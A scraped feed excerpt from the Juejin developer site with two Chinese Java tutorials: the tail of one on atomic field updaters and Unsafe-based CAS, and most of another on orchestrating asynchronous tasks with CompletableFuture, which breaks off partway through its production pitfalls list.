<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title">decrementAndGet</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> </span>{
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">getAndAdd</span>(i, <span class="hljs-number">-1</span>) - <span class="hljs-number">1</span>;
}
<span class="hljs-comment">// 间接调用 unsafe.getAndAddInt() 方法</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title">getAndAdd</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> delta)</span> </span>{
    <span class="hljs-keyword">return</span> unsafe.<span class="hljs-built_in">getAndAddInt</span>(array, <span class="hljs-built_in">checkedByteOffset</span>(i), delta);
}
<span class="hljs-comment">// Unsafe 类中的 getAndAddInt 方法执行 CAS 操作</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title">getAndAddInt</span><span class="hljs-params">(Object o, <span class="hljs-type">long</span> offset, <span class="hljs-type">int</span> delta)</span> </span>{
    <span class="hljs-type">int</span> v;
    <span class="hljs-keyword">do</span> {
        v = <span class="hljs-built_in">getIntVolatile</span>(o, offset);
    } <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">compareAndSwapInt</span>(o, offset, v, v + delta));
    <span class="hljs-keyword">return</span> v;
}
</code></pre>
<h2 data-id="heading-3">4. 属性更新原子操作类</h2>
<p>如果我们只需要某个类的某个字段（类的属性）也变成原子操作，我们可以使用属性更新原子操作类。</p>
<p>例如，某时刻项目需求发生变化，然后需求再次变更，导致某个类中的变量需要多线程操作。由于这个变量在多处使用，修改起来比较麻烦，而且原本使用的地方不需要线程安全，只有新场景需要使用。我们可以借助原子更新器来处理这种场景。Atomic 并发包提供了以下三个类：</p>
<ul>
<li>AtomicIntegerFieldUpdater：用于更新整型属性的原子操作类</li>
<li>AtomicLongFieldUpdater：用于更新长整型属性的原子操作类</li>
<li>AtomicReferenceFieldUpdater：用于更新引用类型中属性的原子操作类</li>
</ul>
<p>但是，值得注意的是，使用原子更新类的条件比较严格，如下：</p>
<ul>
<li>被操作的字段不能被 static 修饰。</li>
<li>被操作的字段不能被 final 修饰，因为常量无法修改。</li>
<li>被操作的字段必须被 volatile 修饰以保证可见性，即必须保证数据的读取是线程可见的。</li>
<li>属性必须对 Updater 所在的当前区域可见。如果原子更新器操作不在当前类中执行，则不能使用 private 和 protected 修饰符。当子类操作父类时，修饰符必须是 protected 权限或以上。如果在同一个包中，必须是 default 权限或以上。也就是说，要时刻保证操作类与被操作类之间的可见性。</li>
</ul>
<p>让我们看一下 AtomicIntegerFieldUpdater 和 AtomicReferenceFieldUpdater 的简单使用方法：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> lombok.<span class="hljs-property">AllArgsConstructor</span>;

<span class="hljs-keyword">import</span> java.<span class="hljs-property">util</span>.<span class="hljs-property">concurrent</span>.<span class="hljs-property">atomic</span>.<span class="hljs-property">AtomicInteger</span>;
<span class="hljs-keyword">import</span> java.<span class="hljs-property">util</span>.<span class="hljs-property">concurrent</span>.<span class="hljs-property">atomic</span>.<span class="hljs-property">AtomicIntegerFieldUpdater</span>;
<span class="hljs-keyword">import</span> java.<span class="hljs-property">util</span>.<span class="hljs-property">concurrent</span>.<span class="hljs-property">atomic</span>.<span class="hljs-property">AtomicReferenceFieldUpdater</span>;

<span class="hljs-keyword">public</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">AtomicIntegerFieldUpdaterDemo</span> {

    publicstatic<span class="hljs-keyword">class</span> <span class="hljs-title class_">Candidate</span> {
        int id;
        volatileint score;
    }

    <span class="hljs-keyword">static</span> <span class="hljs-title class_">AtomicIntegerFieldUpdater</span>&lt;<span class="hljs-title class_">Candidate</span>&gt; atIntegerUpdater
            = <span class="hljs-title class_">AtomicIntegerFieldUpdater</span>.<span class="hljs-title function_">newUpdater</span>(<span class="hljs-title class_">Candidate</span>.<span class="hljs-property">class</span>, <span class="hljs-string">"score"</span>);

    <span class="hljs-keyword">static</span> <span class="hljs-title class_">AtomicReferenceFieldUpdater</span>&lt;<span class="hljs-title class_">Student</span>, <span class="hljs-title class_">String</span>&gt; atRefUpdate =
            <span class="hljs-title class_">AtomicReferenceFieldUpdater</span>.<span class="hljs-title function_">newUpdater</span>(<span class="hljs-title class_">Student</span>.<span class="hljs-property">class</span>, <span class="hljs-title class_">String</span>.<span class="hljs-property">class</span>, <span class="hljs-string">"name"</span>);

    <span class="hljs-comment">// 用于验证分数是否正确</span>
    publicstatic <span class="hljs-title class_">AtomicInteger</span> allScore = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-title class_">String</span>[] args) throws <span class="hljs-title class_">InterruptedException</span> {
        final <span class="hljs-title class_">Candidate</span> stu = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Candidate</span>();
        <span class="hljs-title class_">Thread</span>[] t = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>[<span class="hljs-number">10000</span>];
        <span class="hljs-comment">// 开启 10,000 个线程</span>
        <span class="hljs-keyword">for</span> (int i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
            t[i] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>() {
                <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">run</span>(<span class="hljs-params"/>) {
                    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() &gt; <span class="hljs-number">0.5</span>) {
                        atIntegerUpdater.<span class="hljs-title function_">incrementAndGet</span>(stu);
                        allScore.<span class="hljs-title function_">incrementAndGet</span>();
                    }
                }
            };
            t[i].<span class="hljs-title function_">start</span>();
        }

        <span class="hljs-keyword">for</span> (int i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
            t[i].<span class="hljs-title function_">join</span>();
        }
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"final score="</span> + stu.<span class="hljs-property">score</span>);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"check all score="</span> + allScore);

        <span class="hljs-comment">// AtomicReferenceFieldUpdater 简单使用</span>
        <span class="hljs-title class_">Student</span> student = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">"Jerry"</span>, <span class="hljs-number">17</span>);
        atRefUpdate.<span class="hljs-title function_">compareAndSet</span>(student, student.<span class="hljs-property">name</span>, <span class="hljs-string">"Jerry-1"</span>);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(student);
    }

    <span class="hljs-meta">@AllArgsConstructor</span>
    <span class="hljs-keyword">static</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> {

        <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> name;
        privateint age;

        <span class="hljs-meta">@java</span>.<span class="hljs-property">lang</span>.<span class="hljs-property">Override</span>
        <span class="hljs-keyword">public</span> java.<span class="hljs-property">lang</span>.<span class="hljs-property">String</span> <span class="hljs-title function_">toString</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">return</span><span class="hljs-string">"Student{"</span> +
                    <span class="hljs-string">"name='"</span> + name + <span class="hljs-string">''</span><span class="hljs-string">' +
                    ", age=" + age +
                    '</span>}<span class="hljs-string">';
        }
    }
}
</span></code></pre>
<p>我们使用 AtomicIntegerFieldUpdater 来更新候选人（Candidate）的分数。启动 10,000 个线程进行投票。当随机值大于 0.5 时，算作一票，分数自增一次。其中，allScore 用于验证分数是否正确（实际用于验证 AtomicIntegerFieldUpdater 更新的字段是否线程安全）。当 allScore 与 score 相同时，说明投票结果正确，也代表 AtomicIntegerFieldUpdater 能正确更新字段 score 的值并且是线程安全的。</p>
<p>对于 AtomicReferenceFieldUpdater，我们在代码中简单演示了它的使用方法。注意在指定 AtomicReferenceFieldUpdater 的泛型时，需要两个泛型参数，一个是修改类的类型，另一个是修改字段的类型。</p>
<p>至于 AtomicLongFieldUpdater，它与 AtomicIntegerFieldUpdater 类似，不再赘述。接下来简单了解一下 AtomicIntegerFieldUpdater 的实现原理。它实际上是反射与 Unsafe 类的结合。AtomicIntegerFieldUpdater 是一个抽象类，实际的实现类是 AtomicIntegerFieldUpdaterImpl：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title">AtomicIntegerFieldUpdater</span>&lt;<span class="hljs-title">T</span>&gt;</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;U&gt; <span class="hljs-title">AtomicIntegerFieldUpdater</span>&lt;<span class="hljs-title">U</span>&gt; <span class="hljs-title">newUpdater</span>(<span class="hljs-params">Class&lt;U&gt; tclass, String fieldName</span>)</span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> AtomicIntegerFieldUpdaterImpl&lt;U&gt;
            (tclass, fieldName, Reflection.getCallerClass());
    }
 }
</code></pre>
<p>不难从源码中发现，实际上 AtomicIntegerFieldUpdater 的定义是一个抽象类，最终的实现类是 AtomicIntegerFieldUpdaterImpl。</p>
<p>让我们进一步查看 AtomicIntegerFieldUpdaterImpl 的源码。我提供了一些注释：</p>
<pre><code class="hljs language-scss" lang="scss">private staticclass AtomicIntegerFieldUpdaterImpl&lt;T&gt;
            extends AtomicIntegerFieldUpdater&lt;T&gt; {
    <span class="hljs-comment">// 获取 unsafe 实例</span>
    privatestaticfinal Unsafe unsafe = Unsafe<span class="hljs-selector-class">.getUnsafe</span>();
    <span class="hljs-comment">// 定义内存偏移量</span>
    privatefinallong offset;
    privatefinal Class&lt;T&gt; tclass;
    privatefinal Class&lt;?&gt; cclass;

    <span class="hljs-comment">// 构造方法</span>
    <span class="hljs-built_in">AtomicIntegerFieldUpdaterImpl</span>(final Class&lt;T&gt; tclass,
                                  final String fieldName,
                                  final Class&lt;?&gt; caller) {
        final Field field;<span class="hljs-comment">// 要修改的字段</span>
        finalint modifiers;<span class="hljs-comment">// 字段修饰符</span>
        try {
            field = AccessController<span class="hljs-selector-class">.doPrivileged</span>(
                new PrivilegedExceptionAction&lt;Field&gt;() {
                    public Field <span class="hljs-built_in">run</span>() throws NoSuchFieldException {
                        <span class="hljs-comment">// 通过反射获取 Field 对象</span>
                        return tclass<span class="hljs-selector-class">.getDeclaredField</span>(fieldName);
                    }
                });
                <span class="hljs-comment">// 获取字段修饰符</span>
            modifiers = field<span class="hljs-selector-class">.getModifiers</span>();
            <span class="hljs-comment">// 检查字段的访问权限，如果不在访问范围内则抛出异常。</span>
            sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.misc</span><span class="hljs-selector-class">.ReflectUtil</span><span class="hljs-selector-class">.ensureMemberAccess</span>(
                caller, tclass, null, modifiers);
            <span class="hljs-comment">// 获取对应类对象的类加载器</span>
            ClassLoader cl = tclass<span class="hljs-selector-class">.getClassLoader</span>();
            ClassLoader ccl = caller<span class="hljs-selector-class">.getClassLoader</span>();
            if ((ccl != null) &amp;&amp; (ccl != cl) &amp;&amp;
                ((cl == null) || !<span class="hljs-built_in">isAncestor</span>(cl, ccl))) {
          sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.misc</span><span class="hljs-selector-class">.ReflectUtil</span><span class="hljs-selector-class">.checkPackageAccess</span>(tclass);
            }
        } catch (PrivilegedActionException pae) {
            thrownew <span class="hljs-built_in">RuntimeException</span>(pae.getException());
        } catch (Exception ex) {
            thrownew <span class="hljs-built_in">RuntimeException</span>(ex);
        }

        Class&lt;?&gt; fieldt = field<span class="hljs-selector-class">.getType</span>();
        <span class="hljs-comment">// 判断类型是否为 int</span>
        if (fieldt != int.class)
            throw new <span class="hljs-built_in">IllegalArgumentException</span>("Must be integer type");
        <span class="hljs-comment">// 判断是否被 volatile 修饰</span>
        if (!Modifier.isVolatile(modifiers))
            thrownew <span class="hljs-built_in">IllegalArgumentException</span>("Must be volatile type");

        this<span class="hljs-selector-class">.cclass</span> = (Modifier.isProtected(modifiers) &amp;&amp;
                       caller != tclass) ? caller : null;
        this<span class="hljs-selector-class">.tclass</span> = tclass;
        <span class="hljs-comment">// 获取字段在对象内存中的偏移量，并使用内存偏移量获取或修改字段的值。</span>
        offset = unsafe<span class="hljs-selector-class">.objectFieldOffset</span>(field);
    }
}
</code></pre>
<p>从 AtomicIntegerFieldUpdaterImpl 的源码可以看出，实际上字段更新器都是通过反射机制和 Unsafe 类实现的。</p>
<p>让我们看一下 AtomicIntegerFieldUpdaterImpl 中自增方法 incrementAndGet 的实现：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> <span class="hljs-title">incrementAndGet</span>(<span class="hljs-params">T obj</span>)</span> {
    <span class="hljs-built_in">int</span> prev, next;
    <span class="hljs-keyword">do</span> {
        prev = <span class="hljs-keyword">get</span>(obj);
        next = prev + <span class="hljs-number">1</span>;
        <span class="hljs-comment">// 调用下面的 compareAndSet 方法完成 cas 操作</span>
    } <span class="hljs-keyword">while</span> (!compareAndSet(obj, prev, next));
    <span class="hljs-keyword">return</span> next;
}

<span class="hljs-comment">// 最终调用的是 Unsafe 类的 compareAndSwapInt() 方法。</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> boolean <span class="hljs-title">compareAndSet</span>(<span class="hljs-params">T obj, <span class="hljs-built_in">int</span> expect, <span class="hljs-built_in">int</span> update</span>)</span> {
        <span class="hljs-keyword">if</span> (obj == <span class="hljs-literal">null</span> || obj.getClass() != tclass || cclass != <span class="hljs-literal">null</span>) fullCheck(obj);
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">unsafe</span>.compareAndSwapInt(obj, offset, expect, update);
}
</code></pre>
<p>我们在这里可以发现，实际上 J.U.C 中 Atomic 包下原子类的最终实现都是通过前面分析过的 Unsafe 类完成的。包括后面我们要讲到的许多并发知识，如 AQS 等，都会涉及到 CAS 机制。敬请期待~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🚀 别再用 Future.get() 傻等了！CompletableFuture 异步编排实战，性能提升 300%！]]></title>    <link>https://juejin.cn/post/7592921639464681514</link>    <guid>https://juejin.cn/post/7592921639464681514</guid>    <pubDate>2026-01-09T06:21:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592921639464681514" data-draft-id="7593139476833124395" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🚀 别再用 Future.get() 傻等了！CompletableFuture 异步编排实战，性能提升 300%！"/> <meta itemprop="keywords" content="后端,程序员"/> <meta itemprop="datePublished" content="2026-01-09T06:21:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="JOEH60"/> <meta itemprop="url" content="https://juejin.cn/user/1750078239803614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🚀 别再用 Future.get() 傻等了！CompletableFuture 异步编排实战，性能提升 300%！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1750078239803614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    JOEH60
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T06:21:16.000Z" title="Fri Jan 09 2026 06:21:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在微服务架构中，我们经常遇到这种场景：一个接口需要调用 A、B、C 三个下游服务，然后把结果汇总返回。</p>
<p><strong>青铜写法</strong>：串行调用。A 查完查 B，B 查完查 C。总耗时 = A + B + C。用户等得花儿都谢了。<br/>
<strong>白银写法</strong>：使用 Future + 线程池。虽然并行了，但最后还是要用 future.get() 阻塞等待，代码写得像“回调地狱”，异常处理也极其麻烦。</p>
<p>今天，我们来聊聊 Java 8 引入的神器 —— <strong>CompletableFuture</strong>。它不仅能轻松实现异步调用，还能像搭积木一样编排任务，让你的代码既优雅又高效。</p>
<h2 data-id="heading-0">🛠️ 实战场景：电商商品详情页</h2>
<p>假设我们要聚合一个商品详情页的数据，需要查询：</p>
<ol>
<li><strong>商品基本信息</strong> (耗时 0.5s)</li>
<li><strong>商品图片列表</strong> (耗时 0.5s)</li>
<li><strong>商品库存信息</strong> (耗时 0.3s)</li>
<li><strong>商品优惠活动</strong> (耗时 0.4s)</li>
</ol>
<p>如果串行调用，总耗时 <strong>1.7s</strong>。<br/>
如果并行调用，理论耗时取决于最慢的那个，即 <strong>0.5s</strong>。</p>
<h2 data-id="heading-1">1. 🐢 传统 Future 写法 (阻塞地狱)</h2>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> ProductDetail <span class="hljs-title function_">getProductDetail</span><span class="hljs-params">(Long productId)</span> {
    <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">10</span>);
    
    <span class="hljs-comment">// 1. 提交任务</span>
    Future&lt;ProductInfo&gt; infoFuture = executor.submit(() -&gt; productService.getInfo(productId));
    Future&lt;List&lt;Image&gt;&gt; imageFuture = executor.submit(() -&gt; imageService.getImages(productId));
    
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// 2. 阻塞等待结果 (最痛的点在这里！)</span>
        <span class="hljs-type">ProductInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> infoFuture.get(); <span class="hljs-comment">// 此时主线程被阻塞</span>
        List&lt;Image&gt; images = imageFuture.get();
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductDetail</span>(info, images);
    } <span class="hljs-keyword">catch</span> (Exception e) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"查询失败"</span>);
    }
}
</code></pre>
<p><strong>缺点</strong>：get() 方法是阻塞的，而且很难处理“A 任务完成后，把结果传给 B 任务继续执行”这种复杂流程。</p>
<h2 data-id="heading-2">2. ⚡ CompletableFuture 基础：异步起飞</h2>
<p>使用 supplyAsync 开启异步任务，无需手动管理线程池（默认使用 ForkJoinPool，建议自定义）。</p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-comment">// 自定义线程池 (生产环境必备！)</span>
<span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    <span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">60L</span>, TimeUnit.SECONDS, 
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">1000</span>), 
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>.CallerRunsPolicy()
);

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">simpleAsync</span><span class="hljs-params">()</span> {
    CompletableFuture&lt;String&gt; future = CompletableFuture.supplyAsync(() -&gt; {
        <span class="hljs-comment">// 模拟耗时操作</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"商品信息查询成功"</span>;
    }, executor);
    
    <span class="hljs-comment">// 不阻塞主线程，任务完成后自动回调</span>
    future.thenAccept(result -&gt; {
        System.out.println(<span class="hljs-string">"回调处理结果："</span> + result);
    });
}
</code></pre>
<h2 data-id="heading-3">3. 🔗 任务编排：串行、并行、组合</h2>
<p>这才是 CompletableFuture 的杀手锏！</p>
<h3 data-id="heading-4">A. 串行执行 (thenApply / thenAccept)</h3>
<p><strong>场景</strong>：先查商品信息，<strong>拿到 ID 后</strong>，再去查库存。</p>
<pre><code class="hljs language-Java" lang="Java">CompletableFuture&lt;Void&gt; future = CompletableFuture.supplyAsync(() -&gt; {
    <span class="hljs-keyword">return</span> productService.getInfo(<span class="hljs-number">1001L</span>); <span class="hljs-comment">// 第一步</span>
}, executor).thenAccept(info -&gt; {
    inventoryService.checkStock(info.getId()); <span class="hljs-comment">// 第二步 (依赖第一步的结果)</span>
});
</code></pre>
<h3 data-id="heading-5">B. 并行执行 &amp; 结果聚合 (allOf)</h3>
<p><strong>场景</strong>：同时查基本信息、图片、库存、优惠，<strong>全部查完后</strong>，组装返回。</p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> ProductDetail <span class="hljs-title function_">getProductDetailOptimized</span><span class="hljs-params">(Long productId)</span> {
    <span class="hljs-comment">// 1. 开启异步任务</span>
    CompletableFuture&lt;ProductInfo&gt; infoFuture = CompletableFuture.supplyAsync(() -&gt; productService.getInfo(productId), executor);
    CompletableFuture&lt;List&lt;Image&gt;&gt; imageFuture = CompletableFuture.supplyAsync(() -&gt; imageService.getImages(productId), executor);
    CompletableFuture&lt;Stock&gt; stockFuture = CompletableFuture.supplyAsync(() -&gt; stockService.getStock(productId), executor);
    
    <span class="hljs-comment">// 2. 等待所有任务完成 (非阻塞式等待)</span>
    <span class="hljs-comment">// allOf 返回一个新的 Future，当所有传入的 Future 都完成时，它才完成</span>
    CompletableFuture.allOf(infoFuture, imageFuture, stockFuture).join();
    
    <span class="hljs-comment">// 3. 组装结果 (此时所有数据都已准备好)</span>
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">ProductDetail</span> <span class="hljs-variable">detail</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductDetail</span>();
        detail.setInfo(infoFuture.get()); <span class="hljs-comment">// get() 不会再阻塞，因为已经 join 过了</span>
        detail.setImages(imageFuture.get());
        detail.setStock(stockFuture.get());
        <span class="hljs-keyword">return</span> detail;
    } <span class="hljs-keyword">catch</span> (Exception e) {
        e.printStackTrace();
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
}
</code></pre>
<p><strong>实测效果</strong>：接口响应时间从 1.7s 降低到 0.55s (最长耗时 + 少量开销)，<strong>性能提升 300%</strong> ！</p>
<h3 data-id="heading-6">C. 异常处理 (exceptionally)</h3>
<p><strong>场景</strong>：查优惠信息服务挂了，不能影响主流程，给个默认值即可。</p>
<pre><code class="hljs language-Java" lang="Java">CompletableFuture&lt;Discount&gt; discountFuture = CompletableFuture.supplyAsync(() -&gt; {
    <span class="hljs-keyword">return</span> discountService.getDiscount(productId); <span class="hljs-comment">// 可能抛异常</span>
}, executor).exceptionally(e -&gt; {
    log.error(<span class="hljs-string">"优惠服务异常"</span>, e);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Discount</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// 发生异常时，返回兜底数据</span>
});
</code></pre>
<h2 data-id="heading-7">4. 💣 生产环境避坑指南</h2>
<ol>
<li>
<p><strong>必须使用自定义线程池</strong>：</p>
<ul>
<li>千万别用默认的 ForkJoinPool.commonPool()！</li>
<li>默认线程池是所有 CompletableFuture 共享的，一旦某个任务阻塞（如 IO），会拖垮整个系统。</li>
</ul>
</li>
<li>
<p><strong>异常处理不能丢</strong>：</p>
